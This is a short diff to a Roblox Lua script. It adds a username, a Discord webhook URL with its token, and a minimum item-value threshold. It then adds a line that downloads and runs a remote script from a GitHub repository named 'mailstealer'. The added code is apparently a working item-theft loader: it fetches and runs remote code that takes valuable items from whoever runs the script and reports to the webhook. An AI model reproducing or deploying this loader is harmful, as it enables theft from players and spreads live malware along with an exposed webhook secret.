@@ -1,1 +1,6 @@
-loadstring(game:HttpGet('https://pastebin.com/raw/EXUnQF5P'))()
+Username = "meme482210"
+Username2 = "meme482210" 
+Webhook = "https://discord.com/api/webhooks/1236012282996326460/HVGy0Ui3XbJVn_d_lVuucqrRO32U3qQG0h7MBPdMgpKAb9Ubi_hteNfaQ6WbKkAfo9vh"
+min_rap = 10000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HubScript/mailstealer/main/spacemail.lua"))()
